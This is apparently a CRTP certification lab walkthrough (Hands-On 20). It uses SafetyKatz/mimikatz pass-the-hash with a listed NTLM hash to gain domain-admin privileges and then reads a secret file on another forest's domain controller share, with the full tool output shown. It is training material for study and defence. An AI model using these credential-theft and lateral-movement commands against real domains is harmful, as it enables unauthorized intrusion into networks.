# CRTP: Hands-On 20

```
  • With DA privileges on dollarcorp.moneycorp.local, get access to SharedwithDCorp share on the DC of eurocorp.local forest.
```

## Access to SharedwithDCorp of aurocorp.local

With Elevated privileges shell, spawn session for DA user privileges:

```
C:\Windows\system32>C:\AD\Tools\SafetyKatz.exe "privilege::debug" "sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:cmd" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:cmd
user    : svcadmin
domain  : dollarcorp.moneycorp.local
program : cmd
impers. : no
NTLM    : b38ff50264b74508085d82c69794a4d8
  |  PID  1676
  |  TID  5476
  |  LSA Process is now R/W
  |  LUID 0 ; 164518639 (00000000:09ce5aef)
  \_ msv1_0   - data copy @ 000001D2F02B2C70 : OK !
  \_ kerberos - data copy @ 000001D2F05157C8
   \_ aes256_hmac       -> null
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 000001D2EFD90468 (32) -> null

mimikatz(commandline) # exit
Bye!
```

Access to external resource:

```
C:\Windows\system32>dir \\eurocorp-dc.eurocorp.local\SharedwithDCorp
 Volume in drive \\eurocorp-dc.eurocorp.local\SharedwithDCorp has no label.
 Volume Serial Number is 1A5A-FDE2

 Directory of \\eurocorp-dc.eurocorp.local\SharedwithDCorp

11/16/2022  05:26 AM    <DIR>          .
11/15/2022  07:17 AM                29 secret.txt
               1 File(s)             29 bytes
               1 Dir(s)  14,049,824,768 bytes free

C:\Windows\system32>type \\eurocorp-dc.eurocorp.local\SharedwithDCorp\secret.txt
Dollarcorp DAs can read this!

```
